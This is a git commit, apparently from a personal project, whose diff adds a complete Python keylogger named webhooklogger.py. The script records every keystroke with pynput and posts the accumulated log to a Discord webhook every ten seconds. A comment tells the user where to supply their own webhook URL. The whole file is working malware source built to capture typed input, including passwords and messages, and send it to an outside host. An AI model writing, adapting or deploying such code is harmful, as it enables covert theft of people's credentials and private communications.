7cd7c36705da67c754a8f859f6f0542a82919fff
Brandon Burns <brandontbb33@gmail.com>
2025-12-10 02:33:51 -0800

    Added discord webhook function for keylogger. Separated into two separate files for logging into file and discord.

---
+++ Keylogger/webhooklogger.py
@@ -0,0 +1,41 @@
+import requests
+import threading
+import os
+from pynput import keyboard
+from dotenv import load_dotenv
+
+# Note: os and dotenv not needed for this script. Only included to hide webhook URL. 
+# Replace "os.getenv("WEBHOOK_URL")" with your webhook URL. 
+
+load_dotenv()
+
+log = ""
+WEBHOOK_URL = os.getenv("WEBHOOK_URL")
+
+def report():
+    global log
+    if log:
+        requests.post(WEBHOOK_URL, json={"content": log})
+        log = ""
+    
+    timer = threading.Timer(10, report)
+    timer.start()
+
+def on_press(key):
+    global log
+    try:     
+        log = log + key.char
+    except AttributeError:
+        if key == keyboard.Key.space:
+            log = log + " "
+        elif key == keyboard.Key.enter:
+            log = log + "\n"
+        else:
+            log = log + ('[' + str(key) + ']')
+    if key == keyboard.Key.esc:
+        return False
+
+if __name__ == "__main__":
+    report()
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
